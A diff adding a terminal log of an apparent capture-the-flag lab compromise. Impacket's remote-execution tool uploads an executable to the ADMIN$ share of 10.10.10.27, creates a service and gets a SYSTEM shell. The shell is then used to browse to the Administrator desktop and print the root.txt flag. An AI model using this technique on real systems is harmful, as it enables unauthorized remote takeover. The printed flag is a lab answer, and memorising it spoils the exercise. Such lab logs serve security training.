@@ -1,0 +1,79 @@
+Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.27.....
+[*] Found writable share ADMIN$
+[*] Uploading file YVzjntpg.exe
+[*] Opening SVCManager on 10.10.10.27.....
+[*] Creating service xNPL on 10.10.10.27.....
+[*] Starting service xNPL.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+C:\> Volume in drive C has no label.
+ Volume Serial Number is CE13-2325
+
+ Directory of C:\
+
+01/20/2020  05:20 AM    <DIR>          backups
+09/15/2018  12:12 AM    <DIR>          PerfLogs
+01/19/2020  04:09 PM    <DIR>          Program Files
+01/19/2020  04:08 PM    <DIR>          Program Files (x86)
+08/10/2021  10:18 AM                 0 type
+01/19/2020  11:39 PM    <DIR>          Users
+08/10/2021  10:27 AM    <DIR>          Windows
+               1 File(s)              0 bytes
+               6 Dir(s)  33,819,934,720 bytes free
+
+C:\>
+C:\Users> Volume in drive C has no label.
+ Volume Serial Number is CE13-2325
+
+ Directory of C:\Users
+
+01/19/2020  04:10 PM    <DIR>          .
+01/19/2020  04:10 PM    <DIR>          ..
+01/19/2020  11:39 PM    <DIR>          Administrator
+01/19/2020  11:39 PM    <DIR>          Public
+01/20/2020  06:01 AM    <DIR>          sql_svc
+               0 File(s)              0 bytes
+               5 Dir(s)  33,819,934,720 bytes free
+
+C:\Users>
+C:\Users\Administrator> Volume in drive C has no label.
+ Volume Serial Number is CE13-2325
+
+ Directory of C:\Users\Administrator
+
+01/19/2020  11:39 PM    <DIR>          .
+01/19/2020  11:39 PM    <DIR>          ..
+01/19/2020  11:39 PM    <DIR>          3D Objects
+01/19/2020  11:39 PM    <DIR>          Contacts
+01/20/2020  06:42 AM    <DIR>          Desktop
+01/19/2020  11:39 PM    <DIR>          Documents
+01/19/2020  11:39 PM    <DIR>          Downloads
+01/19/2020  11:39 PM    <DIR>          Favorites
+01/19/2020  11:39 PM    <DIR>          Links
+01/19/2020  11:39 PM    <DIR>          Music
+01/19/2020  11:39 PM    <DIR>          Pictures
+01/19/2020  11:39 PM    <DIR>          Saved Games
+01/19/2020  11:39 PM    <DIR>          Searches
+01/19/2020  11:39 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              14 Dir(s)  33,819,832,320 bytes free
+
+C:\Users\Administrator>
+C:\Users\Administrator\Desktop> Volume in drive C has no label.
+ Volume Serial Number is CE13-2325
+
+ Directory of C:\Users\Administrator\Desktop
+
+01/20/2020  06:42 AM    <DIR>          .
+01/20/2020  06:42 AM    <DIR>          ..
+02/25/2020  07:36 AM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  33,819,807,744 bytes free
+
+C:\Users\Administrator\Desktop>b91ccec3305e98240082d4474b848528
+C:\Users\Administrator\Desktop>
